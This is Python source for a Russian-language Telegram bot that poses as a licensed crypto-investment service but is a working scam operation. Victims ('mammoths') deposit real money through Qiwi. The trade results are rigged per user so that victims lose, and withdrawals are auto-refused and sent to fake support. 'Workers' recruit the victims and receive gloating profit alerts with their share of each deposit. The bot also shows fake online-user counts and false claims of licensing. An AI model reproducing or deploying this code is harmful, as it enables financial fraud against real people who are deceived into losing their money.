import asyncio
import sqlite3
import json
import random
import requests
from environs import Env
from pyqiwip2p import QiwiP2P
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, message
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import CallbackQuery, Message
from aiogram.utils.callback_data import CallbackData
import scenes
import functions
from datetime import datetime

env = Env()
env.read_env()

NAME_TEAM = env.str('NAME_TEAM')
NAME_TRADING = env.str('NAME_TRADING')
TOKEN_TRADING = env.str('TOKEN_TRADING')
TOKEN_WORKER = env.str('TOKEN_WORKER')

PATHS = env.str('PATHS')
BD_PATH = env.str('BD_PATH')

LOGS_CHANNEL_ID = env.str('LOGS_CHANNEL_ID')
LOGS_CHAT_ID = env.str('LOGS_CHAT_ID')
USERNAME_TRADING_BOT = env.str('USERNAME_TRADING_BOT')

bot = Bot(TOKEN_TRADING, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
worker_bot = Bot(TOKEN_WORKER, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class enterCode(StatesGroup):
    ref_code = State()

class Deposit(StatesGroup):
    enter_amount = State()

class TradeState(StatesGroup):
    q1 = State()

class Withdraw(StatesGroup):
    q1 = State()

async def stock_panel() -> InlineKeyboardMarkup:
    bitcoin = InlineKeyboardButton(text="Bitcoin", callback_data="bitcoin")
    ethereum = InlineKeyboardButton(text="Ethereum", callback_data="ethereum")
    polkadot = InlineKeyboardButton(text="Polkadot", callback_data="polkadot")
    ripple = InlineKeyboardButton(text="Ripple", callback_data="ripple")
    doge = InlineKeyboardButton(text="DogeCoin", callback_data="doge")
    litecoin = InlineKeyboardButton(text="Litecoin", callback_data="litecoin")
    terra = InlineKeyboardButton(text="Terra", callback_data="terra")
    solana = InlineKeyboardButton(text="Solana", callback_data="solana")
    tron = InlineKeyboardButton(text="TRON", callback_data="tron")
    cardano = InlineKeyboardButton(text="Cardano", callback_data="cardano")
    return InlineKeyboardMarkup(row_width=2).add(bitcoin, ethereum, polkadot, ripple, doge, litecoin, terra, solana,tron, cardano)

async def choose(amount) -> InlineKeyboardMarkup:
    up = InlineKeyboardButton(text="⬆️Повышение", callback_data=choose_callback.new(amount=amount, direction="up"))
    down = InlineKeyboardButton(text="⬇️Понижение", callback_data=choose_callback.new(amount=amount, direction="down"))
    return InlineKeyboardMarkup(row_width=1).add(up, down)

choose_callback = CallbackData("choose", "amount", "direction")

print(f"{NAME_TEAM} | Trading: Трейдинг бот был запущен!")

@dp.message_handler(chat_type='private', commands="start", state="*")
async def start(message: types.Message, state: FSMContext):
    try:
        referal_code = message.get_args()
        with sqlite3.connect(BD_PATH) as cursor:
            user = cursor.execute("SELECT * FROM users_trading WHERE id = ?", (message.from_user.id,)).fetchone()
        if user is None:
            with sqlite3.connect(BD_PATH) as cursor:
                worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (referal_code,)).fetchone()
            if worker is None:
                await message.answer(f"Для начала работы, напишите код-приглашение пригласившего Вас человека")
                await enterCode.ref_code.set()
            else:
                await message.answer(f"Добро пожаловать!👋 \n\n"
                                     f"Вас приветствует официальный бот по крипто-инвестициям {NAME_TRADING} 📈 \n\n"
                                     f"В данный момент в боте вы можете торговать разной криптовалютой и без проблем выводить заработанные средства.", reply_markup=scenes.main)
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute('INSERT INTO users_trading VALUES (?, ?, ?, ?, ?, ?)', (message.from_user.id, referal_code, 0, message.from_user.first_name, 1, 0))
                await worker_bot.send_message(worker[0], f"@{message.from_user.username} - твой новый мамонт🦣")
        else:
            if user[5] == 1:
                return
            await message.answer(f"Добро пожаловать!👋 \n\n"
                                 f"Вас приветствует официальный бот по крипто-инвестициям {NAME_TRADING} 📈 \n\n"
                                 f"В данный момент в боте вы можете торговать разной криптовалютой и без проблем выводить заработанные средства.", reply_markup=scenes.main)
    except Exception as e:
        print(e)
        print(f"{NAME_TEAM} | Trading: У Трейдинг бота возникла ошибка во время выполнения хендлера! Известные данные:")
        print(f"{NAME_TEAM} | Trading: {message.from_user.username} | {message.from_user.id} - {message.text}")

@dp.message_handler(state=enterCode.ref_code)
async def answer_code(message: types.Message, state: FSMContext):
    await state.update_data(code=message.text)
    data = await state.get_data()
    with sqlite3.connect(BD_PATH) as cursor:
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (data.get('code'),)).fetchone()
    if worker is None:
        await message.answer("⚠️ Напишите правильный код-приглашение пригласившего Вас человека")
    else:
        await message.answer(f"Добро пожаловать!👋 \n\n"
                             f"Вас приветствует официальный бот по крипто-инвестициям {NAME_TRADING} 📈 \n\n"
                             f"В данный момент в боте вы можете торговать разной криптовалютой и без проблем выводить заработанные средства.", reply_markup=scenes.main)
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute('INSERT INTO users_trading VALUES (?, ?, ?, ?, ?, ?)', (message.from_user.id, data.get('code'), 0, message.from_user.first_name, 1, 0))
        await worker_bot.send_message(worker[0], f"@{message.from_user.username} - твой новый мамонт🦣")
        await state.finish()

@dp.message_handler(chat_type='private', content_types=['text'], text='💼 Личный Кабинет')
async def profile(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    if profile[5] == 1:
        return
    await message.answer_photo(open(f'{PATHS}/Trading/logo.jpg', 'rb'), f"📲 <b>Ваш личный кабинет</b> \n\n"
                                                               f"💸 Баланс: {profile[2]} ₽ \n\n"
                                                               f"🔒 Ваш персональный ID: {message.from_user.id} \n\n"
                                                               f"📈 <b>Активных пользователей онлайн: {random.randint(1123, 4962)}</b>", reply_markup=scenes.profile)

@dp.message_handler(chat_type='private', content_types=['text'], text='ℹ️ Информация')
async def information(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    if user[5] == 1:
        return
    await message.answer(f"<b>ℹ️ Информация</b> \n\n"
                         f"<b>{NAME_TRADING}</b> -  твой личный помощник в мире трейдинга. Сервис создан на основе официального API криптобиржи и имеет все необходимые лицензии и разрешения. \n\n"
                         f"Ты можешь приглашать друзей и зарабатывать! \n\n"
                         f"Смотри описание рефералки.", reply_markup=scenes.information)

@dp.message_handler(chat_type='private', content_types=['text'], text='📈 Мой ECN счёт')
async def information(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    if user[5] == 1:
        return
    await message.answer(f"<b>Выберите актив:</b>", reply_markup=await stock_panel())

@dp.callback_query_handler(text='stats_network')
async def stats_network(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    await call.message.answer(f"📈 <b>Состояние сети Bitcoin</b> \n\n"
                              f"Загруженность: 🟢 низкая \n"
                              f"Количество блоков: ≈ 1 \n"
                              f"Размер: 1.9 mB (1.4 mVB) \n"
                              f"Неподтверждённых транзакций: {random.randint(1421, 3000)} \n"
                              f"Комиссия для попадания в первый блок: \n"
                              f"Минимум: 0.00003072 BTC / kVB \n"
                              f"Медиана: 0.00004096 BTC / kVB \n")

@dp.callback_query_handler(text='referal_system')
async def referal_system(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT * FROM users_trading WHERE id = ?", (call.from_user.id,)).fetchone()
    if user[5] == 1:
        return
    await call.message.answer(f"👫 <b>Рефералка</b> \n\n"
                              f"Приглашай друзей и зарабатывай! \n"
                              f"Ссылка, чтобы поделиться в Telegram: \n"
                              f"https://t.me/{USERNAME_TRADING_BOT}?start={user[1]} \n\n"
                              f"Реферальные выплаты: \n\n"
                              f"Человек, зарегистрировавшийся в боте по твоей ссылке становится твоим рефералом 1-го круга. \n"
                              f"Когда твой реферал 1-го круга выводит деньги - ты получаешь реферальный доход. Если твой реферал 1-го круга приглашает кого-то по своей реферальной ссылке - этот человек становится твоим рефералом 2-го круга. \n\n"
                              f"Реферальный доход рассчитывается следующим образом: \n\n"
                              f"Ты получаешь 60% от реферального вознаграждения со сделки твоего реферала 1-го круга и 40% от этого вознаграждения со сделки твоего реферала 2-го круга. \n\n"
                              f"Размер реферального вознаграждения составляет 30% от комиссии, уплаченной сервису. \n\n"
                              f"Если реферал 1-го или 2-го круга не совершает сделки в период, превышающий один календарный месяц, то реферальное вознаграждение по этому рефералу перестает начисляться.")

@dp.message_handler(chat_type='private', content_types=['text'], text='🧑🏻‍💻Тех. Поддержка')
async def TS(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    if user[5] == 1:
        return
    await message.answer(f"У вас возникли <b>вопросы</b> или <b>проблемы</b> ⁉️ \n\n"
                         f"Вы всегда можете обратиться в нашу службу поддержки \n\n"
                         f"📚 Правила общения с оператором: \n\n"
                         f"➕ Общайтесь вежливо, по ту сторону сидит такой же живой человек, как и Вы. \n\n"
                         f"➕ Старайтесь формулировать обращение к оператору емко и лаконично, в одно сообщение. \n\n"
                         f"➕ Обращаться в поддержку только по существу! \n\n"
                         f"➕ Поддержка не ведёт продаж и не занимается привлечением клиентов! (Только решение споров, об оплате и выводов). \n\n"
                         f"➕ Формулировать обращение к оператору необходимо с квитанцией об оплате \n\n"
                         f"Сообщения по типу: \n"
                         f"- Я не сохранил чек \n"
                         f"- Я перевел, посмотрите \n"
                         f"- Привет(т.д.) \n"
                         f"⚠️ Категорически игнорируются!", reply_markup=scenes.ts)

@dp.callback_query_handler(text='deposit')
async def deposit(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT worker,ban FROM users_trading WHERE id = ?", (call.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT id,min_deposit_trading FROM worker WHERE referal_code = ?", (user[0],)).fetchone()
    if user[1] == 1:
        return
    await call.message.answer(f"Введите сумму пополнения \n"
                              f"<b>Сумма минимального платежа - {worker[1]} ₽</b>")
    await Deposit.enter_amount.set()

@dp.message_handler(state=Deposit.enter_amount)
async def answer_pay(message: types.Message, state: FSMContext):
    await state.update_data(amount=message.text)
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    if user[5] == 1:
        return
    selectPay = InlineKeyboardMarkup(
	    inline_keyboard = [
            [
                InlineKeyboardButton(text = '💵 Оплатить Qiwi/Картой', callback_data = 'selectPay_qiwi,'+message.text)
		    ]
	    ]
    )
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT worker FROM users_trading WHERE id = ?", (message.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT id,min_deposit_trading FROM worker WHERE referal_code = ?", (user[0],)).fetchone()
    if message.text.isnumeric():
        if int(message.text) < worker[1]:
            await message.answer("Неккоректно введена сумма!")
        else:
            await message.answer("Выберите метод оплаты", reply_markup=selectPay)
    await state.finish()
                                
@dp.callback_query_handler(text_startswith='selectPay_qiwi')
async def selectPay_qiwi(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    amount = call.data.split(",")[1]
    comment = random.randint(100000, 999999)
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT worker FROM users_trading WHERE id = ?", (call.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT id,min_deposit_trading FROM worker WHERE referal_code = ?", (user[0],)).fetchone()
        qiwi = cursor.execute("SELECT * FROM qiwi WHERE bot = 'trading'",).fetchone()
        cursor.execute("INSERT INTO qiwi_pays VALUES (?, ?, ?, ?)", (call.from_user.id, USERNAME_TRADING_BOT, comment, '0',))

    p2p = QiwiP2P(auth_key=qiwi[1])
    bill = p2p.bill(bill_id=comment, amount=amount, lifetime=45, comment=comment)
    
    accept_kb = types.InlineKeyboardMarkup()
    accept_kb.add(types.InlineKeyboardButton(text = '✅ Оплатить', callback_data=f"trading_accept,{comment},{call.from_user.id},{amount}"))

    await worker_bot.send_message(worker[0], f"✅ <b>Новая заявка на пополнение!</b> \n"
                                             f"(Трейдинг) \n\n"
                                             f"🐘 Мамонт: {call.from_user.full_name} [@{call.from_user.username}] \n"
                                             f"💸 Сумма: {amount} ₽", reply_markup=accept_kb)

    pay_kb = types.InlineKeyboardMarkup()
    pay_kb.add(types.InlineKeyboardButton(text = 'Оплатить', url=bill.pay_url))
    pay_kb.add(types.InlineKeyboardButton(text = 'Проверить оплату', callback_data=f"check,{comment},{amount}"))
    
    await call.message.answer(f"<b>Создана заявка на пополнение {amount} ₽</b>", reply_markup=pay_kb)

@dp.callback_query_handler(text_startswith='check')
async def checkPay_qiwi(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    comment, price = call.data.split(",")[1], call.data.split(",")[2]
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT * FROM users_trading WHERE id = ?", (call.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()
        pays = cursor.execute("SELECT * FROM qiwi_pays WHERE comment = ?", (comment,)).fetchone()
        share_check = cursor.execute("SELECT * FROM qiwi_pays WHERE id = ? AND bot_username = ? AND status = 1", (call.from_user.id,USERNAME_TRADING_BOT,)).fetchone()
        qiwi = cursor.execute("SELECT p2p_secret_key FROM qiwi WHERE bot = 'trading'",).fetchone()
    check = await functions.pays(qiwi[0], comment)
    share = (float(await functions.worker_sharee(share_check)) * int(price))
    if pays[3] == 1:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?", (pays[2], call.from_user.id,))
        await call.message.edit_text(f'✅ Оплата прошла успешно.')
    else:
        if check:
            current_time = datetime.now()
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE worker SET profits = profits + ? WHERE referal_code = ?", (price, user[1],))
                cursor.execute("UPDATE information SET profits = profits + 1, amount_profits = amount_profits + ? WHERE id = 1", (price,))
                cursor.execute("UPDATE users_trading SET balance = balance + ? WHERE id = ?", (price, call.from_user.id,))
                cursor.execute("UPDATE qiwi_pays SET status = ? WHERE comment = ?", ('1', comment,))
                cursor.execute('INSERT INTO profits VALUES (?, ?, ?, ?)', (call.from_user.id, worker[0], price, current_time.strftime("%Y-%m-%d")))

            if (worker[10] != 1):
                username = worker[1]
            else:
                username = 'Аноним'

            await worker_bot.send_message(LOGS_CHANNEL_ID, f"☠️ <b>Новый профит!</b>  📊 TRADE \n\n"
                                                        f"🏴‍☠️ Обчистил мамонта: <b>{username}</b> \n"
                                                        f"💸 Сумма пополнения: <b>{price}₽</b> \n"
                                                        f"└ Доля воркера: <b>{share}₽</b>")
            await worker_bot.send_sticker(worker[0], "CAACAgIAAxkBAAEGWd9jaiqWrvCr0fgS6PJI_Y3_CS--3QACZAADDbbSGRbBZmuQEnSJKwQ")
            await worker_bot.send_sticker(LOGS_CHAT_ID, "CAACAgIAAxkBAAEGWd9jaiqWrvCr0fgS6PJI_Y3_CS--3QACZAADDbbSGRbBZmuQEnSJKwQ")
            await worker_bot.send_message(LOGS_CHAT_ID, f"☠️ <b>Новый профит!</b>  📊 TRADE \n\n"
                                                        f"🏴‍☠️ Обчистил мамонта: <b>{username}</b> \n"
                                                        f"💸 Сумма пополнения: <b>{price}₽</b> \n"
                                                        f"└ Доля воркера: <b>{share}₽</b>")
            await call.message.edit_text(f'✅ Успешно! Баланс пополнен на <b>{price}₽</b>')
            ADMIN_ID = env.list('ADMIN_ID')
            for admin in ADMIN_ID:
                await worker_bot.send_message(admin, f"☠️ <b>Новый профит!</b>  📊 TRADE \n\n"
                                                    f"🏴‍☠️ Обчистил мамонта: <b>{worker[1]}</b> \n"
                                                    f"💸 Сумма пополнения: <b>{price}₽</b> \n"
                                                    f"└ Доля воркера: <b>{share}₽</b>")
            try:
                await worker_bot.send_message(worker[0], f"☠️ <b>У тебя новый профит!</b>  📊 TRADE \n\n"
                                                        f"🏴‍☠️ Мамонт: <b><a href='tg://user?id={user[0]}'>{user[3]}</a></b> \n"
                                                        f"💸 Сумма пополнения: <b>{price}₽</b> \n"
                                                        f"└ Твоя доля: <b>{share}₽</b>")
            except Exception as e:
                print(e)
                pass
        else:
            await call.message.answer("Оплата не найдена!")

@dp.callback_query_handler(text='withdraw')
async def withdraw(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    if user[2] < 1000:
        await bot.send_message(call.from_user.id, f"Недостаточно средств для вывода!")
    else:
        await bot.send_message(call.from_user.id, f"💁🏻‍♀️ Введите свои реквизиты без + в начале \n\n"
                                                  f"По правилам проекта: вывод доступен только на реквизиты с которых было сделано пополнение. \n\n"
                                                  f"<b>Бот выводит всю сумму Вашего баланса</b>")
        await Withdraw.q1.set()

@dp.message_handler(state=Withdraw.q1)
async def withdraw_q1(message: types.Message,state:FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f"SELECT * FROM users_trading WHERE id = {message.from_user.id}").fetchone()
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?",(user[1],)).fetchone()
    if user[5] == 1:
        return

    withdraw_form = InlineKeyboardMarkup(
        inline_keyboard = [
            [
                InlineKeyboardButton(text="💸ВЫВЕСТИ💸", callback_data=f"withdraw_balance,{message.from_user.id},trading"),
                InlineKeyboardButton(text="❌ОТМЕНИТЬ❌", callback_data=f"no_withdraw_balance,{message.from_user.id},{user[2]},trading")
            ]
        ]
    )        
    if message.text.isdigit():
        if int(message.text) == worker[2]:
            await message.answer(f"🔔Вы <b>успешно</b> подали заявку на вывод денежных средств! \n"
                                 f"Рассмотрение заявки происходит в течение часа! \n\n"
                                 f"<b>Сумма:</b> {user[2]} \n"
                                 f"<b>Статус:</b> обрабатывается… \n\n"
                                 f"Мы <b>уведомим</b> Вас, о статусе вывода денежных средств!")
            await worker_bot.send_message(worker[0], f"@{message.from_user.username} создал запрос на вывод средств \n"
                                                    f"💸 Сумма: <b>{user[2]}</b>", reply_markup=withdraw_form)
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_trading SET balance = 0 WHERE id = ?", (message.from_user.id,))
            await state.finish()
        else:
            TS_btn = InlineKeyboardMarkup(
                inline_keyboard = [
                    [
                        InlineKeyboardButton(text="Тех. Поддержка", url="tg://resolve?domain=TradesSuppBinance")
                    ]
                ]
            )        
            await message.answer(f"🚫 <b>Вам было отказано в выводе средств!</b> \n\n"
                                 f"👮‍♂️ Вы пытаетесь вывести на реквизиты, с которых НЕ пополняли \n"
                                 f"❗️ <b>Обратитесь в техническую поддержку</b>", reply_markup=TS_btn)
            await worker_bot.send_message(worker[0], f"🔥Мамонт @{message.from_user.username} запросил вывод {user[2]} на свои реквизиты, произошла автоматическая отмена🔁")
    else:
        await message.answer("Вы ввели не реквизиты! \n"
                             "Вы вернулись в главное меню", reply_markup=scenes.main)
    await state.finish()

@dp.callback_query_handler(text=["bitcoin", "ethereum", "polkadot", "doge", "ripple", "litecoin", "terra", "solana", "tron", "cardano"])
async def ecn(call: types.CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    if call.data == "bitcoin":
        name_crypto = "Bitcoin"
        litteral_crypto = "BTC"
        description = "A p2p payment system that uses the unit of the same name to record transactions."
    elif call.data == "ethereum":
        name_crypto = "Ethereum"
        litteral_crypto = "ETH"
        description = "Cryptocurrency and platform for creating decentralized blockchain-based online services powered by smart contracts."
    elif call.data == "polkadot":
        name_crypto = "Polkadot"
        litteral_crypto = "DOT"
        description = ""
    elif call.data == "doge":
        name_crypto = "Dogecoin"
        litteral_crypto = "Doge"
        description = "Cryptocurrency based on Litecoin. Named after the Internet meme Doge. It was introduced on December 8, 2013."
    elif call.data == "ripple":
        name_crypto = "Ripple"
        litteral_crypto = "XRP"
        description = "Cryptocurrency platform for payment systems focused on currency exchange transactions without chargebacks."
    elif call.data == "litecoin":
        name_crypto = "Litecoin"
        litteral_crypto = "LTC"
        description = "Fork of Bitcoin, a peer-to-peer electronic payment system using the cryptocurrency of the same name."
    elif call.data == "terra":
        name_crypto = "Terra"
        litteral_crypto = "LUNA"
        description = ""
    elif call.data == "solana":
        name_crypto = "Solana"
        litteral_crypto = "SOL"
        description = ""
    elif call.data == "tron":
        name_crypto = "TRX"
        litteral_crypto = "TRX"
        description = ""
    elif call.data == "cardano":
        name_crypto = "Cardano"
        litteral_crypto = "ADA"
        description = ""
    
    await call.message.answer_photo(open(f"{PATHS}/Trading/crypto/{call.data}.jpg", 'rb'),
                              f"<b>{name_crypto}/USD</b> \n\n"
                              f"🔸 Символ: <b>{litteral_crypto}</b> \n"
                              f"{description} \n\n"
                              f"💰 Введите сумму инвестиций \n"
                              f"Минимальная сумма инвестиций - 100 ₽\n\n"
                              f"Ваш баланс: {user[2]} ₽", reply_markup=scenes.cancel)
    await TradeState.q1.set()

@dp.message_handler(state=TradeState.q1)
async def check_sum(message: types.Message, state: FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {message.from_user.id}').fetchone()
    try:
        if 100 > int(message.text) or int(message.text) > user[2]:
            await message.answer("Неккоректно введена сумма \n"
                                 "Повторите ввод\n\n"
                                 "<b>Минимальная сумма инвестиций - 100</b>", reply_markup=scenes.cancel)
        else:
            await message.answer("📊Выберите, как поведёт себя курс актива \n\n"
                                 "📈 Коэффициенты: \n"
                                 "⬆️Повышение - Х2 \n"
                                 "⬇️Понижение - X2", reply_markup=await choose(int(message.text)))
    except ValueError:
        await message.answer("Что-то пошло не так!")
    await state.finish()

@dp.callback_query_handler(choose_callback.filter(direction="up"))
async def up_btn(call: types.CallbackQuery, callback_data: dict):
    await result(call, int(callback_data.get("amount")), "⬆️Повышение")

@dp.callback_query_handler(choose_callback.filter(direction="down"))
async def down_btn(call: types.CallbackQuery, callback_data: dict):
    await result(call, int(callback_data.get("amount")), "⬇️Понижение")

async def result(call: types.CallbackQuery, amount: int, direction: str):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_trading WHERE id = {call.from_user.id}').fetchone()
    for i in range(1, 21):
        await bot.edit_message_text(f"📊 Результаты будут известны через {20 - i} секунд", call.message.chat.id, call.message.message_id)
        await asyncio.sleep(1)
    if user[4] == 2:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute("UPDATE users_trading SET balance = balance + ? WHERE id = ?", (amount, call.from_user.id,))
        await call.message.answer(f"📈 Стоимость валюты пошла {direction} \n"
                                  f"✅ Ваш прогноз оказался верным \n\n"
                                  f"Доступно: {int(user[2]) + amount}", reply_markup=scenes.cancel)
    elif user[4] == 1:
        forecast = random.randint(1, 2)
        if direction == '⬆️Повышение':
            direct = '⬇️Понижение'
        else:
            direct = '⬆️Повышение'
        if forecast == 1:
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_trading SET balance = balance + ? WHERE id = ?", (amount, call.from_user.id,))
            await call.message.answer(f"📈 Стоимость валюты пошла {direct} \n"
                                      f"✅ Ваш прогноз оказался верным \n\n"
                                      f"Доступно: {int(user[2]) + amount}", reply_markup=scenes.cancel)
        else:
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_trading SET balance = balance - ? WHERE id = ?", (amount, call.from_user.id,))
            await call.message.answer(f"📈 Стоимость валюты пошла {direct} \n"
                                      f"❌Ваш прогноз оказался неверным \n\n"
                                      f"Доступно: {int(user[2]) - amount}", reply_markup=scenes.cancel)
    else:
        if direction == '⬆️Повышение':
            direct = '⬇️Понижение'
        else:
            direct = '⬆️Повышение'
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute("UPDATE users_trading SET balance = balance - ? WHERE id = ?", (amount, call.from_user.id,))
        await call.message.answer(f"📈Стоимость валюты пошла {direct} \n"
                                  f"❌Ваш прогноз оказался неверным \n\n"
                                  f"Доступно: {int(user[2]) - amount}", reply_markup=scenes.cancel)
    await TradeState.q1.set()

@dp.callback_query_handler(text="cancel", state="*")
async def cancel_btn(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await call.message.answer("Отмена", reply_markup=scenes.main)

# start bot
if __name__ == '__main__':
    executor.start_polling(dp)